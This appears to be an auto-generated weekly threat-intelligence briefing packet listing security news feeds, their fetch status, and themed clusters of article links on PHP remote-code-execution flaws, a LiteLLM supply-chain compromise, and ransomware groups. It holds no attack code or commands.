# PHANTOMSignal Briefing Packet

- Generated: 2026-10-23T18:13:02.235485+00:00
- Lookback hours: 168
- Lookback human: 7 days
- Total feeds: 80
- Feeds OK: 76
- Total items in window: 454
- Total clusters raw: 234
- Total clusters in packet: 80
- Dropped low score: 118
- Dropped overflow: 36

## Cohort metadata

### threat_research_primary
- Description: Primary vendor and research-team intelligence with strong technical depth.
- Source count: 16
- Weight: 10

### government_authoritative
- Description: Authoritative English-language public-sector sources for advisories, vulnerabilities, standards, and public guidance.
- Source count: 2
- Weight: 9

### offensive_vulnerability_research
- Description: High-signal vulnerability research, offensive security analysis, and exploitability-focused sources.
- Source count: 9
- Weight: 10

### detection_response_operations
- Description: Practitioner-oriented sources focused on detection, response, hunting, MDR, and security operations.
- Source count: 11
- Weight: 8

### cloud_identity_infrastructure
- Description: Cloud, identity, SaaS, and infrastructure security research with emphasis on modern attack surfaces.
- Source count: 9
- Weight: 7

### ai_security_agentic_risk
- Description: AI security, LLM exploitation, model integrity, agentic system risk, and AI governance sources.
- Source count: 7
- Weight: 6

### ransomware_ecrime_financial_crime
- Description: Cybercrime, ransomware, extortion, fraud, and illicit financial ecosystem reporting.
- Source count: 4
- Weight: 7

### cyber_news_breach_reporting
- Description: Cybersecurity news, breach reporting, and industry trend coverage. Useful for awareness, not sufficient alone for technical claims.
- Source count: 8
- Weight: 4

### policy_strategy_geopolitics
- Description: Policy, strategy, cyber norms, geopolitics, national security, and regulatory interpretation.
- Source count: 1
- Weight: 5

### practitioner_analysis
- Description: Independent practitioner, researcher, and analyst voices. Best used for framing, interpretation, and reality checks.
- Source count: 6
- Weight: 5

### reddit_practitioner_osint
- Description: Reddit-based practitioner chatter and operational OSINT. Useful for weak signals, field texture, and reality checks, but never sufficient alone for technical claims.
- Source count: 7
- Weight: 2

## Feed status

- **Unit 42** (threat_research_primary)
  - URL: https://unit42.paloaltonetworks.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 5
- **Microsoft Threat Intelligence** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **CrowdStrike** (threat_research_primary)
  - URL: https://www.crowdstrike.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Microsoft Security Blog** (threat_research_primary)
  - URL: https://www.microsoft.com/en-us/security/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Google Threat Analysis Group** (threat_research_primary)
  - URL: https://blog.google/threat-analysis-group/rss/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Recorded Future** (threat_research_primary)
  - URL: https://www.recordedfuture.com/feed
  - Status: ok
  - Item count: 50
  - In window count: 2
- **SentinelOne Labs** (threat_research_primary)
  - URL: https://www.sentinelone.com/labs/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Trend Micro Research** (threat_research_primary)
  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
  - Status: ok
  - Item count: 25
  - In window count: 0
- **Kaspersky Securelist** (threat_research_primary)
  - URL: https://securelist.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Sekoia** (threat_research_primary)
  - URL: https://blog.sekoia.io/feed/
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Citizen Lab** (threat_research_primary)
  - URL: https://citizenlab.ca/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Cisco Talos** (threat_research_primary)
  - URL: https://feeds.feedburner.com/feedburner/Talos
  - Status: ok
  - Item count: 15
  - In window count: 5
- **NCSC UK** (government_authoritative)
  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Check Point Research** (threat_research_primary)
  - URL: https://research.checkpoint.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 3
- **ESET WeLiveSecurity** (threat_research_primary)
  - URL: https://www.welivesecurity.com/en/rss/feed/
  - Status: ok
  - Item count: 100
  - In window count: 2
- **SANS Internet Storm Center** (government_authoritative)
  - URL: https://isc.sans.edu/rssfeed_full.xml
  - Status: ok
  - Item count: 10
  - In window count: 7
- **Red Canary** (detection_response_operations)
  - URL: https://redcanary.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Volexity** (threat_research_primary)
  - URL: https://www.volexity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Exploit-DB** (offensive_vulnerability_research)
  - URL: https://www.exploit-db.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 11
- **PortSwigger Research** (offensive_vulnerability_research)
  - URL: https://portswigger.net/research/rss
  - Status: ok
  - Item count: 40
  - In window count: 0
- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - URL: https://horizon3.ai/feed/
  - Status: ok
  - Item count: 10
  - In window count: 8
- **Assetnote** (offensive_vulnerability_research)
  - URL: https://www.assetnote.io/resources/research/rss.xml
  - Status: ok
  - Item count: 78
  - In window count: 0
- **watchTowr Labs** (offensive_vulnerability_research)
  - URL: https://labs.watchtowr.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 0
- **The DFIR Report** (detection_response_operations)
  - URL: https://thedfirreport.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Black Hills Information Security** (detection_response_operations)
  - URL: https://www.blackhillsinfosec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **TrustedSec** (detection_response_operations)
  - URL: https://www.trustedsec.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Active Countermeasures** (detection_response_operations)
  - URL: https://www.activecountermeasures.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Proofpoint Threat Insight** (detection_response_operations)
  - URL: https://www.proofpoint.com/us/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **GitHub Security Lab** (offensive_vulnerability_research)
  - URL: https://github.blog/category/security/feed/
  - Status: ok
  - Item count: 10
  - In window count: 1
- **Sophos X-Ops** (detection_response_operations)
  - URL: https://news.sophos.com/en-us/category/threat-research/feed/
  - Status: ok
  - Item count: 15
  - In window count: 4
- **Rapid7** (offensive_vulnerability_research)
  - URL: https://www.rapid7.com/blog/rss/
  - Status: ok
  - Item count: 20
  - In window count: 7
- **SpecterOps** (detection_response_operations)
  - URL: https://medium.com/feed/specter-ops-posts
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Datadog Security Labs** (cloud_identity_infrastructure)
  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
  - Status: ok
  - Item count: 30
  - In window count: 4
- **Orca Security Research** (cloud_identity_infrastructure)
  - URL: https://orca.security/resources/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 3
- **Permiso Security** (cloud_identity_infrastructure)
  - URL: https://permiso.io/blog/rss.xml
  - Status: ok
  - Item count: 10
  - In window count: 0
- **Huntress** (detection_response_operations)
  - URL: https://www.huntress.com/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 8
- **Trail of Bits** (offensive_vulnerability_research)
  - URL: https://blog.trailofbits.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 1
- **AWS Security Blog** (cloud_identity_infrastructure)
  - URL: https://aws.amazon.com/blogs/security/feed/
  - Status: ok
  - Item count: 20
  - In window count: 4
- **Sysdig** (detection_response_operations)
  - URL: https://sysdig.com/feed/
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Google Cloud Threat Intelligence** (threat_research_primary)
  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Protect AI** (ai_security_agentic_risk)
  - URL: https://protectai.com/blog/rss.xml
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **Cloudflare Security** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/security/rss/
  - Status: ok
  - Item count: 20
  - In window count: 5
- **Google DeepMind Blog** (ai_security_agentic_risk)
  - URL: https://deepmind.google/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 1
- **Cloudflare Radar** (cloud_identity_infrastructure)
  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
  - Status: ok
  - Item count: 20
  - In window count: 0
- **Wiz Research** (cloud_identity_infrastructure)
  - URL: https://www.wiz.io/feed/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 8
- **Google Cloud Security** (cloud_identity_infrastructure)
  - URL: https://cloudblog.withgoogle.com/rss/
  - Status: ok
  - Item count: 20
  - In window count: 20
- **Chainalysis** (ransomware_ecrime_financial_crime)
  - URL: https://www.chainalysis.com/blog/feed/
  - Status: ok
  - Item count: 10
  - In window count: 0
- **OpenSSF Blog** (ai_security_agentic_risk)
  - URL: https://openssf.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 4
- **Coveware** (ransomware_ecrime_financial_crime)
  - URL: https://www.coveware.com/blog?format=rss
  - Status: parse_error
  - Item count: 0
  - In window count: 0
- **The Record** (cyber_news_breach_reporting)
  - URL: https://therecord.media/feed
  - Status: ok
  - Item count: 5
  - In window count: 5
- **GreyNoise** (cloud_identity_infrastructure)
  - URL: https://www.greynoise.io/blog/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **BleepingComputer** (cyber_news_breach_reporting)
  - URL: https://www.bleepingcomputer.com/feed/
  - Status: ok
  - Item count: 15
  - In window count: 15
- **Interconnects** (ai_security_agentic_risk)
  - URL: https://www.interconnects.ai/feed
  - Status: ok
  - Item count: 20
  - In window count: 2
- **Simon Willison** (ai_security_agentic_risk)
  - URL: https://simonwillison.net/atom/everything/
  - Status: ok
  - Item count: 30
  - In window count: 13
- **SecurityWeek** (cyber_news_breach_reporting)
  - URL: https://www.securityweek.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **CyberScoop** (cyber_news_breach_reporting)
  - URL: https://cyberscoop.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Help Net Security** (cyber_news_breach_reporting)
  - URL: https://www.helpnetsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Intel 471** (ransomware_ecrime_financial_crime)
  - URL: https://intel471.com/blog/feed
  - Status: ok
  - Item count: 50
  - In window count: 1
- **Dark Reading** (cyber_news_breach_reporting)
  - URL: https://www.darkreading.com/rss.xml
  - Status: ok
  - Item count: 50
  - In window count: 32
- **AI Snake Oil** (ai_security_agentic_risk)
  - URL: https://www.aisnakeoil.com/feed
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Team Cymru** (ransomware_ecrime_financial_crime)
  - URL: https://www.team-cymru.com/post/rss.xml
  - Status: ok
  - Item count: 100
  - In window count: 100
- **Schneier on Security** (practitioner_analysis)
  - URL: https://www.schneier.com/feed/atom/
  - Status: ok
  - Item count: 10
  - In window count: 6
- **Troy Hunt** (practitioner_analysis)
  - URL: https://www.troyhunt.com/rss/
  - Status: ok
  - Item count: 15
  - In window count: 1
- **Reddit r/cybersecurity** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/cybersecurity/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/blueteamsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/blueteamsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Graham Cluley** (practitioner_analysis)
  - URL: https://grahamcluley.com/feed/
  - Status: ok
  - Item count: 20
  - In window count: 3
- **Reddit r/sysadmin** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/sysadmin/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **The Hacker News** (cyber_news_breach_reporting)
  - URL: https://feeds.feedburner.com/TheHackersNews
  - Status: ok
  - Item count: 50
  - In window count: 50
- **Reddit r/msp** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/msp/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsecstudents** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsecstudents/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Krebs on Security** (practitioner_analysis)
  - URL: https://krebsonsecurity.com/feed/
  - Status: ok
  - Item count: 10
  - In window count: 2
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - URL: https://www.infosecurity-magazine.com/rss/news/
  - Status: ok
  - Item count: 100
  - In window count: 23
- **Reddit r/AskNetsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/AskNetsec/.rss
  - Status: ok
  - Item count: 0
  - In window count: 0
- **Reddit r/netsec** (reddit_practitioner_osint)
  - URL: https://www.reddit.com/r/netsec/.rss
  - Status: ok
  - Item count: 25
  - In window count: 21
- **Embrace the Red** (ai_security_agentic_risk)
  - URL: https://embracethered.com/blog/index.xml
  - Status: ok
  - Item count: 100
  - In window count: 0
- **tl;dr sec** (practitioner_analysis)
  - URL: https://tldrsec.com/feed.xml
  - Status: ok
  - Item count: 20
  - In window count: 1
- **Risky Business News** (practitioner_analysis)
  - URL: https://risky.biz/feeds/risky-business-news/
  - Status: ok
  - Item count: 100
  - In window count: 6
- **Just Security** (policy_strategy_geopolitics)
  - URL: https://www.justsecurity.org/feed/
  - Status: ok
  - Item count: 10
  - In window count: 10
- **Elastic Security Labs** (detection_response_operations)
  - URL: https://www.elastic.co/security-labs/rss/feed.xml
  - Status: ok
  - Item count: 100
  - In window count: 2
- **Google Project Zero** (offensive_vulnerability_research)
  - URL: https://googleprojectzero.blogspot.com/feeds/posts/default
  - Status: ok
  - Item count: 10
  - In window count: 0

## Affinity groups (themes)

### CVE-2026-109618 exploitation activity
- Anchor signal: CVE-2026-109618
- Theme key: cve-2026-109618
- Cluster count: 11
- Article count: 29
- Cohesion: 0.408
- Shared strong signals: CVE-2026-109618
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
  - urgency_signals: actively_exploited, no_patch_yet
- Cluster IDs: 62cacaf073, 59969a7c2a, 27252b6951, 03ad94fad0, 65f0b10f8b, 5806ce98aa, fa232b0e92, 5e9563cebc, f320a38d8c, 9ccfc452c8, 21772a3458
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-109618-cve-2026-109619/
  - https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php
  - https://securelist.com/tr/php2shell-critical-vulnerabilities-in-php/121596/
  - https://www.exploit-db.com/exploits/52704
  - https://orca.security/resources/blog/php2shell-php-rce-vulnerabilities/
  - https://isc.sans.edu/diary/rss/33440
  - https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
  - https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619/
  - https://www.sophos.com/en-us/blog/proof-of-concept-exploit-released-for-php-vulnerabilities-109618-109619
  - https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection
  - https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/
  - https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/
  - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
  - https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
  - https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php
  - https://thehackernews.com/2026/10/php2shell-exploit-attempts-hit-millions.html
  - https://www.reddit.com/r/netsec/comments/1xb5g1c/php_rce_cve2026109618/
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/
  - https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
  - https://thehackernews.com/2026/10/urgent-php-warns-of-another-unpatched.html
  - https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
  - https://blog.talosintelligence.com/two-critical-rces-in-php-core/
  - https://thehackernews.com/2026/10/php2shell-two-unpatched-critical-php.html
  - https://krebsonsecurity.com/2026/10/widespread-php-flaw-may-cause-many-site-outages-today/
  - https://thehackernews.com/2026/10/someone-tried-to-exploit-php2shell-4.html
  - https://horizon3.ai/attack-research/attack-blogs/php2shell-exposure-exploitability/
  - https://blog.cloudflare.com/php-vulnerabilities-waf-protection/

### CVE-2026-109619 exploitation activity
- Anchor signal: CVE-2026-109619
- Theme key: cve-2026-109619
- Cluster count: 11
- Article count: 29
- Cohesion: 0.408
- Shared strong signals: CVE-2026-109619
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - cve_ids: CVE-2026-109618, CVE-2026-109619, CVE-2026-115560
  - urgency_signals: actively_exploited, no_patch_yet
- Cluster IDs: 62cacaf073, 59969a7c2a, 27252b6951, 03ad94fad0, 65f0b10f8b, 5806ce98aa, fa232b0e92, 5e9563cebc, f320a38d8c, 9ccfc452c8, 21772a3458
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-109618-cve-2026-109619/
  - https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php
  - https://securelist.com/tr/php2shell-critical-vulnerabilities-in-php/121596/
  - https://www.exploit-db.com/exploits/52704
  - https://orca.security/resources/blog/php2shell-php-rce-vulnerabilities/
  - https://isc.sans.edu/diary/rss/33440
  - https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
  - https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619/
  - https://www.sophos.com/en-us/blog/proof-of-concept-exploit-released-for-php-vulnerabilities-109618-109619
  - https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection
  - https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/
  - https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/
  - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
  - https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
  - https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php
  - https://thehackernews.com/2026/10/php2shell-exploit-attempts-hit-millions.html
  - https://www.reddit.com/r/netsec/comments/1xb5g1c/php_rce_cve2026109618/
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/
  - https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
  - https://thehackernews.com/2026/10/urgent-php-warns-of-another-unpatched.html
  - https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
  - https://blog.talosintelligence.com/two-critical-rces-in-php-core/
  - https://thehackernews.com/2026/10/php2shell-two-unpatched-critical-php.html
  - https://krebsonsecurity.com/2026/10/widespread-php-flaw-may-cause-many-site-outages-today/
  - https://thehackernews.com/2026/10/someone-tried-to-exploit-php2shell-4.html
  - https://horizon3.ai/attack-research/attack-blogs/php2shell-exposure-exploitability/
  - https://blog.cloudflare.com/php-vulnerabilities-waf-protection/

### AWS active exploitation
- Anchor signal: AWS
- Theme key: aws
- Cluster count: 5
- Article count: 26
- Cohesion: 0.215
- Shared strong signals: AWS
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, supply_chain
  - affected_products: AWS
  - cve_ids: CVE-2026-109618, CVE-2026-109619
  - urgency_signals: actively_exploited, preauth_unauth
- Cluster IDs: 62cacaf073, 0c3d84d7ed, 27252b6951, 1d63c3b8c3, 5f2d69d128
- Links:
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-109618-cve-2026-109619/
  - https://www.rapid7.com/blog/post/etr-cve-2026-109618-and-cve-2026-109619-critical-unauthenticated-remote-code-execution-in-php
  - https://securelist.com/tr/php2shell-critical-vulnerabilities-in-php/121596/
  - https://www.exploit-db.com/exploits/52704
  - https://orca.security/resources/blog/php2shell-php-rce-vulnerabilities/
  - https://isc.sans.edu/diary/rss/33440
  - https://webflow.sysdig.com/blog/php2shell-cve-2026-109618-and-cve-2026-109619-detecting-unauthenticated-remote-code-execution-in-php-core
  - https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619/
  - https://www.sophos.com/en-us/blog/proof-of-concept-exploit-released-for-php-vulnerabilities-109618-109619
  - https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection
  - https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/
  - https://unit42.paloaltonetworks.com/cve-2026-109618-cve-2026-109619/
  - https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities
  - https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/
  - https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php
  - https://thehackernews.com/2026/10/php2shell-exploit-attempts-hit-millions.html
  - https://www.reddit.com/r/netsec/comments/1xb5g1c/php_rce_cve2026109618/
  - https://www.wiz.io/blog/artex-in-the-wild-storm-0940-expands-targeting-of-it-and-software-vendors
  - https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
  - https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-docker/
  - https://thehackernews.com/2026/10/litellm-compromised-in-supply-chain.html
  - https://www.helpnetsecurity.com/2026/10/22/litellm-compromised-supply-chain-attack-pypi-docker/
  - https://www.bleepingcomputer.com/news/security/litellm-release-pipeline-hacked-to-distribute-info-stealer-malware/
  - https://www.wiz.io/blog/php2shell-php-rce

### WordPress active exploitation
- Anchor signal: WordPress
- Theme key: wordpress
- Cluster count: 5
- Article count: 5
- Cohesion: 0.431
- Shared strong signals: WordPress
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation, data_breach, ddos
  - affected_products: WordPress, Drupal, OpenAI/ChatGPT
  - cve_ids: CVE-2026-109618, CVE-2026-109619
  - urgency_signals: preauth_unauth, poc_available, actively_exploited
- Cluster IDs: 65f0b10f8b, 5806ce98aa, 5e9563cebc, 21772a3458, 42fec6ef81
- Links:
  - https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
  - https://blog.talosintelligence.com/two-critical-rces-in-php-core/
  - https://krebsonsecurity.com/2026/10/widespread-php-flaw-may-cause-many-site-outages-today/
  - https://blog.cloudflare.com/php-vulnerabilities-waf-protection/
  - https://simonwillison.net/2026/Oct/21/php-security-release/

### Drupal vulnerability activity
- Anchor signal: Drupal
- Theme key: drupal
- Cluster count: 4
- Article count: 4
- Cohesion: 0.3
- Shared strong signals: Drupal
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Drupal, WordPress, OpenAI/ChatGPT
  - cve_ids: CVE-2026-109618, CVE-2026-109619
  - urgency_signals: preauth_unauth, poc_available
- Cluster IDs: 65f0b10f8b, 5806ce98aa, 5f2d69d128, 42fec6ef81
- Links:
  - https://www.recordedfuture.com/blog/php2shell-vulnerability-exploitation
  - https://blog.talosintelligence.com/two-critical-rces-in-php-core/
  - https://www.wiz.io/blog/php2shell-php-rce
  - https://simonwillison.net/2026/Oct/21/php-security-release/

### PyPI vulnerability activity
- Anchor signal: PyPI
- Theme key: pypi
- Cluster count: 3
- Article count: 12
- Cohesion: 0.254
- Shared strong signals: PyPI
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Docker, GitHub, PyPI
- Cluster IDs: 3d6ca9f782, 1d63c3b8c3, 8cb026f4f0
- Links:
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-langflow-mongodb-and-more
  - https://www.securityweek.com/litellm-compromised-in-fresh-supply-chain-attack/
  - https://thehackernews.com/2026/10/litellm-suspects-github-token-leak-in.html
  - https://openssf.org/blog/2026/10/16/case-study-github-expands-malware-advisories-across-eight-ecosystems-with-openssf/
  - https://www.bleepingcomputer.com/news/security/machine-speed-attacks-require-machine-speed-detection-and-response/
  - https://www.darkreading.com/cyberattacks-data-breaches/ovhcloud-github-compromise-glassworm-threat-actors
  - https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-docker/
  - https://thehackernews.com/2026/10/litellm-compromised-in-supply-chain.html
  - https://www.helpnetsecurity.com/2026/10/22/litellm-compromised-supply-chain-attack-pypi-docker/
  - https://www.bleepingcomputer.com/news/security/litellm-release-pipeline-hacked-to-distribute-info-stealer-malware/
  - https://www.wiz.io/blog/litellm-compromised-steals-credentials

### Docker vulnerability activity
- Anchor signal: Docker
- Theme key: docker
- Cluster count: 3
- Article count: 12
- Cohesion: 0.254
- Shared strong signals: Docker
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - affected_products: Docker, GitHub, PyPI
- Cluster IDs: 3d6ca9f782, 1d63c3b8c3, 8cb026f4f0
- Links:
  - https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-langflow-mongodb-and-more
  - https://www.securityweek.com/litellm-compromised-in-fresh-supply-chain-attack/
  - https://thehackernews.com/2026/10/litellm-suspects-github-token-leak-in.html
  - https://openssf.org/blog/2026/10/16/case-study-github-expands-malware-advisories-across-eight-ecosystems-with-openssf/
  - https://www.bleepingcomputer.com/news/security/machine-speed-attacks-require-machine-speed-detection-and-response/
  - https://www.darkreading.com/cyberattacks-data-breaches/ovhcloud-github-compromise-glassworm-threat-actors
  - https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-docker/
  - https://thehackernews.com/2026/10/litellm-compromised-in-supply-chain.html
  - https://www.helpnetsecurity.com/2026/10/22/litellm-compromised-supply-chain-attack-pypi-docker/
  - https://www.bleepingcomputer.com/news/security/litellm-release-pipeline-hacked-to-distribute-info-stealer-malware/
  - https://www.wiz.io/blog/litellm-compromised-steals-credentials

### Ivanti active exploitation
- Anchor signal: Ivanti
- Theme key: ivanti
- Cluster count: 3
- Article count: 10
- Cohesion: 0.2
- Shared strong signals: Ivanti
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: Ivanti
  - urgency_signals: preauth_unauth, actively_exploited
- Cluster IDs: 1b0472c213, d3ec98e7ca, 59969a7c2a
- Links:
  - https://horizon3.ai/attack-research/cve-2026-106173-deep-dive-fortisiem-grpc-path-traversal-file-write-rce/
  - https://thehackernews.com/2026/10/critical-fortisiem-flaw-gets-public.html
  - https://www.reddit.com/r/netsec/comments/1xardr3/cve2026106173_deepdive_fortinet_fortisiem_grpc/
  - https://www.team-cymru.com/post/cyber-security-intelligence-edge-device-analysis
  - https://unit42.paloaltonetworks.com/active-exploitation-of-pan-os-cve-2026-0257/
  - https://thehackernews.com/2026/10/qilin-and-inc-ransomware-groups-exploit.html
  - https://www.darkreading.com/endpoint-security/beyondtrust-remote-support-exploited-edge-bugs
  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-76268/

### GitLab active exploitation
- Anchor signal: GitLab
- Theme key: gitlab
- Cluster count: 3
- Article count: 6
- Cohesion: 0.25
- Shared strong signals: GitLab
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: active_exploitation
  - affected_products: GitLab
  - urgency_signals: actively_exploited, no_patch_yet, poc_available, preauth_unauth
- Cluster IDs: 27252b6951, 1906b7d782, 119c62509b
- Links:
  - https://www.bleepingcomputer.com/news/security/php-shares-mitigation-for-new-and-unpatched-rce-vulnerability/
  - https://thehackernews.com/2026/10/critical-gitlab-flaw-cvss-100-could.html
  - https://www.bleepingcomputer.com/news/security/gitlab-warns-of-new-max-severity-code-execution-vulnerability/
  - https://www.bleepingcomputer.com/news/security/hpe-patches-eight-max-severity-rce-and-auth-bypass-aos-flaws/

### ShinyHunters: ransomware extortion
- Anchor signal: ShinyHunters
- Theme key: shinyhunters
- Cluster count: 3
- Article count: 6
- Cohesion: 0.495
- Shared strong signals: ShinyHunters
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage
  - actor_attribution: ShinyHunters, Cl0p
  - affected_industries: manufacturing_industrial
- Cluster IDs: 5aee3fe755, 0be1df44fd, 88364fe6d8
- Links:
  - https://krebsonsecurity.com/2026/10/feds-suspect-ransom-negotiator-ran-shinyhunters-extortion-site/
  - https://www.securityweek.com/in-other-news-tor-exit-relays-hijacked-banks-spot-rogue-ai-agents-self-rebuilding-macos-ransomware/
  - https://www.team-cymru.com/post/validating-shinyhunters-cyber-threat-actors-infrastructure
  - https://risky.biz/RBNEWS623/
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january

### Cl0p: ransomware extortion
- Anchor signal: Cl0p
- Theme key: cl0p
- Cluster count: 3
- Article count: 4
- Cohesion: 0.487
- Shared strong signals: Cl0p
- Member CVEs: (none)
- Also targets: (none)
- Dominant features:
  - threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, apt_espionage
  - actor_attribution: Cl0p, ShinyHunters
  - affected_industries: manufacturing_industrial
- Cluster IDs: fb556ca51b, 0be1df44fd, 88364fe6d8
- Links:
  - https://www.team-cymru.com/post/cl0p-ransomware-mft-attack-pattern-threat-intelligence
  - https://www.team-cymru.com/post/webmin-vulnerability-and-port-scanning-activity
  - https://www.team-cymru.com/post/research-shows-number-of-potentially-compromised-organizations-more-than-doubles-since-january

### CVE-2026-101767 exploitation activity
- Anchor signal: CVE-2026-101767
- Theme key: cve-2026-101767
- Cluster count: 2
- Article count: 2
- Cohesion: 0.2
